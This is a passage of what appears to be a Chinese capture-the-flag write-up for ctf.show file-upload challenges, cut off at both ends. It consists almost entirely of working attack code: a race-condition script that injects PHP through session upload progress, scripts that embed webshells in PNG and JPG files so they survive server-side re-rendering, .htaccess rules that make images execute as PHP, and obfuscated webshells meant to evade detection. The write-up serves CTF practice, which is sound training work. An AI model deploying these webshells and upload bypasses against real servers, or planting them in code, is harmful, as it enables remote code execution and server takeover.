operator">=</span> <span class="token string">"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/"</span>url2 <span class="token operator">=</span> <span class="token string">"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/upload"</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php system("tac ../f*");?>'</span><span class="token punctuation">&#125;</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token string">'j1an'</span><span class="token punctuation">&#125;</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sess<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span>           threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>163</strong></p><p>同上</p><p><strong>164</strong></p><p>png图片二次渲染</p><pre class="line-numbers language-none"><code class="language-none">在php中包含需要渲染的代码时<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接用大佬脚本生成一张图片咯</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img &#x3D; imagecreatetruecolor(32, 32);for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;   $r &#x3D; $p[$y];   $g &#x3D; $p[$y+1];   $b &#x3D; $p[$y+2];   $color &#x3D; imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y &#x2F; 3), 0, $color);&#125;imagepng($img,&#39;kkk.png&#39;);  &#x2F;&#x2F;要修改的图片的路径&#x2F;*木马内容&lt;?$_GET[0]($_POST[1]);?&gt;*&#x2F;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>165</strong></p><p>jpg图片二次渲染</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system('tac f*');?>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>用法  php exp.php a.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>166</strong></p><p>x-zip-compressed</p><p><strong>167</strong></p><p>提示中为httpd，肯定与apache有关，尝试解析漏洞，上传shell.php.xxx发现执行失败，尝试上传.htaccess</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch &quot;png&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;或者AddType application&#x2F;x-httpd-php .png   &#x2F;&#x2F;将.png后缀的文件解析 成php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>OK</p><p><strong>168</strong></p><p>构造免杀木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; &quot;s#y#s#t#e#m&quot;;$b &#x3D; explode(&quot;#&quot;,$a);$c &#x3D; $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];$c($_REQUEST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;substr(&#39;1s&#39;,1).&#39;ystem&#39;;$a($_REQUEST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code 